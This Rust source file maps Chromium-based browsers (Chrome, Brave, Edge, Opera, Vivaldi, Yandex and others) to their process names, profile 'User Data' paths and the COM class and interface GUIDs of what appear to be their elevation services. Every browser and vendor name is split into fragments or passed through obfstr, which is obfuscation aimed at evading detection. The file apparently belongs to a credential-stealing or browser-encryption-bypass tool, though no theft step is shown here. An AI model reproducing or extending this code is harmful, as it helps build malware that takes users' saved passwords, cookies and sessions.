use std::collections::HashMap;
use std::path::PathBuf;
use windows::Win32::UI::Shell::{SHGetKnownFolderPath, FOLDERID_LocalAppData, KNOWN_FOLDER_FLAG};
use windows::Win32::System::Com::CoTaskMemFree;
use windows::core::GUID;

#[derive(Clone, Debug)]
#[allow(dead_code)]
pub struct BrowserConfig {
    pub name: String,
    pub process_name: String,
    pub engine_type: String,
    pub clsid: GUID,
    pub iid: GUID,
    pub iid_v2: Option<GUID>,
    pub user_data_path: PathBuf,
}

pub fn g_local_app_data() -> Option<PathBuf> {
    unsafe {
        match SHGetKnownFolderPath(&FOLDERID_LocalAppData, KNOWN_FOLDER_FLAG(0), None) {
            Ok(ptr) => {
                let path_str = ptr.to_string().unwrap_or_default();
                CoTaskMemFree(Some(ptr.as_ptr() as *const _));
                return Some(PathBuf::from(path_str));
            },
            Err(_) => return None,
        }
    }
}

pub fn g_configs() -> HashMap<String, BrowserConfig> {
    let local_app = g_local_app_data().unwrap_or_default();

    let roaming_app = unsafe {
        use windows::Win32::UI::Shell::{SHGetKnownFolderPath, FOLDERID_RoamingAppData, KNOWN_FOLDER_FLAG};
        use windows::Win32::System::Com::CoTaskMemFree;

        match SHGetKnownFolderPath(&FOLDERID_RoamingAppData, KNOWN_FOLDER_FLAG(0), None) {
            Ok(ptr) => {
                let path_str = ptr.to_string().unwrap_or_default();
                CoTaskMemFree(Some(ptr.as_ptr() as *const _));
                PathBuf::from(path_str)
            },
            Err(_) => PathBuf::new(),
        }
    };

    let ud = obfstr::obfstr!("User Data").to_string();
    let g = ["Goo","gle"].concat();
    let ms = ["Micro","soft"].concat();
    let bs = ["Brave","Software"].concat();
    let os_vendor = ["Opera ","Soft","ware"].concat();
    let yn = ["Yan","dex"].concat();
    let mut map = HashMap::new();

    map.insert(["chr","ome"].concat(), BrowserConfig {
        name: ["Chr","ome"].concat(),
        process_name: ["chr","ome.exe"].concat(),
        engine_type: ["Chrom","ium"].concat(),
        clsid: GUID::from_u128(0x708860E0_F641_4611_8895_7D867DD3675B),
        iid: GUID::from_u128(0x463ABECF_410D_407F_8AF5_0DF35A005CC8),
        iid_v2: Some(GUID::from_u128(0x1BF5208B_295F_4992_B5F4_3A9BB6494838)),
        user_data_path: local_app.join(&g).join(["Chr","ome"].concat()).join(&ud),
    });

    map.insert(["chr","ome-beta"].concat(), BrowserConfig {
        name: ["Chr","ome Beta"].concat(),
        process_name: ["chr","ome.exe"].concat(),
        engine_type: ["Chrom","ium"].concat(),
        clsid: GUID::from_u128(0xDD2646BA_3707_4BF8_B9A7_038691A68FC2),
        iid: GUID::from_u128(0xA2721D66_376E_4D2F_9F0F_9070E9A42B5F),
        iid_v2: Some(GUID::from_u128(0xB96A14B8_D0B0_44D8_BA68_2385B2A03254)),
        user_data_path: local_app.join(&g).join(["Chr","ome Beta"].concat()).join(&ud),
    });

    map.insert(["bra","ve"].concat(), BrowserConfig {
        name: ["Bra","ve"].concat(),
        process_name: ["bra","ve.exe"].concat(),
        engine_type: ["Chrom","ium"].concat(),
        clsid: GUID::from_u128(0x576B31AF_6369_4B6B_8560_E4B203A97A8B),
        iid: GUID::from_u128(0xF396861E_0C8E_4C71_8256_2FAE6D759CE9),
        iid_v2: Some(GUID::from_u128(0x1BF5208B_295F_4992_B5F4_3A9BB6494838)),
        user_data_path: local_app.join(&bs).join(["Brave","-Browser"].concat()).join(&ud),
    });

    map.insert("edge".to_string(), BrowserConfig {
        name: "Edge".to_string(),
        process_name: ["msed","ge.exe"].concat(),
        engine_type: ["Chrom","ium"].concat(),
        clsid: GUID::from_u128(0x1FCBE96C_1697_43AF_9140_2897C7C69767),
        iid: GUID::from_u128(0xC9C2B807_7731_4F34_81B7_44FF7779522B),
        iid_v2: Some(GUID::from_u128(0x8F7B6792_784D_4047_845D_1782EFBEF205)),
        user_data_path: local_app.join(&ms).join("Edge").join(&ud),
    });

    map.insert(["ope","ra"].concat(), BrowserConfig {
        name: ["Ope","ra"].concat(),
        process_name: ["ope","ra.exe"].concat(),
        engine_type: ["Chrom","ium"].concat(),
        clsid: GUID::from_u128(0x708860E0_F641_4611_8895_7D867DD3675B),
        iid: GUID::from_u128(0x463ABECF_410D_407F_8AF5_0DF35A005CC8),
        iid_v2: Some(GUID::from_u128(0x1BF5208B_295F_4992_B5F4_3A9BB6494838)),
        user_data_path: roaming_app.join(&os_vendor).join(["Opera"," Stable"].concat()),
    });

    map.insert(["ope","ra-gx"].concat(), BrowserConfig {
        name: ["Opera"," GX"].concat(),
        process_name: ["ope","ra.exe"].concat(),
        engine_type: ["Chrom","ium"].concat(),
        clsid: GUID::from_u128(0x2593F8B9_4EAF_457C_B68A_50F6B8EA6B54),
        iid: GUID::from_u128(0x463ABECF_410D_407F_8AF5_0DF35A005CC8),
        iid_v2: Some(GUID::from_u128(0x1BF5208B_295F_4992_B5F4_3A9BB6494838)),
        user_data_path: roaming_app.join(&os_vendor).join(["Opera ","GX Stable"].concat()),
    });

    map.insert(["viv","aldi"].concat(), BrowserConfig {
        name: ["Viv","aldi"].concat(),
        process_name: ["viv","aldi.exe"].concat(),
        engine_type: ["Chrom","ium"].concat(),
        clsid: GUID::zeroed(),
        iid: GUID::zeroed(),
        iid_v2: None,
        user_data_path: local_app.join(["Viv","aldi"].concat()).join(&ud),
    });

    map.insert(["yan","dex"].concat(), BrowserConfig {
        name: ["Yan","dex"].concat(),
        process_name: ["brow","ser.exe"].concat(),
        engine_type: ["Chrom","ium"].concat(),
        clsid: GUID::zeroed(),
        iid: GUID::zeroed(),
        iid_v2: None,
        user_data_path: local_app.join(&yn).join(["Yandex","Browser"].concat()).join(&ud),
    });

    map
}
